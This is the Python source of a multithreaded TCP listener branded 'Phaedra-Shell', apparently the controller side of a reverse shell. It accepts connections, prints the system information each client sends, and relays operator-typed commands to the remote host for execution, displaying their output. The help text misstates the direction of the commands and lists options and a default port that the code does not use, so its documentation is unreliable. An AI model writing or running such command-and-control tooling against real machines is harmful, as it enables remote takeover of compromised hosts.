import socket
import sys
import threading
import getopt

host="0.0.0.0"
port=5010
asci_art=r"""
                            _____  _                    _                  _____ _          
                |  __ \| |                  | |                / ____| |        | | |
                | |__) | |__   __ _  ___  __| |_ __ __ _ _____| (___ | |__   ___| | |
                |  ___/| '_ \ / _` |/ _ \/ _` | '__/ _` |______\___ \| '_ \ / _ \ | |
                | |    | | | | (_| |  __/ (_| | | | (_| |      ____) | | | |  __/ | |
                |_|    |_| |_|\__,_|\___|\__,_|_|  \__,_|     |_____/|_| |_|\___|_|_|
            """


def help_docs():
    help_text = """
Usage: python3 server.py [options]

Options:
    -h, --help              Show this help message and exit
    -p, --port <port>       Specify the port on which the server should listen (default: 5050)
    -a, --address <address> Specify the host IP address to listen on (default: 0.0.0.0)

Description:
    This is a simple TCP server that listens for incoming client connections and allows the client to send commands for execution.

Examples:
    python3 server.py -p 5010 -a 127.0.0.1  Start the server listening on port 5010 on localhost
    python3 server.py -a 0.0.0.0          Start the server listening on all interfaces
    python3 server.py --help              Display this help message

Notes:
    The server can handle multiple client connections using threads.
    To exit a connection, type 'exit' when prompted for input.
"""
    print(help_text)



def encode_data(data: str) -> bytes:return data.encode('utf-8')
def decode_data(data: bytes) -> str:return data.decode('utf-8')


def send_command(client_socket, command:str):
    try:
        client_socket.send(encode_data(command))
    except Exception as error:
        print('ERROR: sending command failed')
    

def handle_connection(client_socket):
    try:
        system_data = client_socket.recv(4096)
        print(f'received {decode_data(system_data)}')

        while True:
            command = str( input("input:") ) 
            command = command.rstrip()
            if len( command) and command != 'exit':
                client_socket.send( encode_data(command))
                response = client_socket.recv(4096)
                print(f'output: {decode_data(response)}')
            elif command =='exit':
                client_socket.close()
                break
                
            
    except Exception as error:
        print(f"ERROR: {str(error)}")
        client_socket.close()

def main():
    global port , host
    print(asci_art)

    try:
        opts , args  = getopt.getopt( sys.argv[1:],"hl:p:", ['help', 'port=', '--listein'])
        for o, a in opts:
            if o in ('-p', '--port'):
                port = int(a)
            if o in ('-l', '--listen'):
                host = a
            if o in ('-h', '--help'):
                help_docs()
                sys.exit(4)

    except getopt.GetoptError as error:
        print(f'OPT ERROR: {str(error)}')
        sys.exit(3)


    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    server.bind( (host,port) )
    server.listen(5)

    print(f"server is listening on {host}:{port}")

    
    try:
        while True:
            client, addr = server.accept()
            print(f"received connection from {str(addr)}")
            server_thread = threading.Thread( target= handle_connection , args=(client,))  
            server_thread.start()

    except KeyboardInterrupt as error:
            print("---closing down server---")
    finally:
        server.close()   
    
    
    
        
if __name__=="__main__":
    main()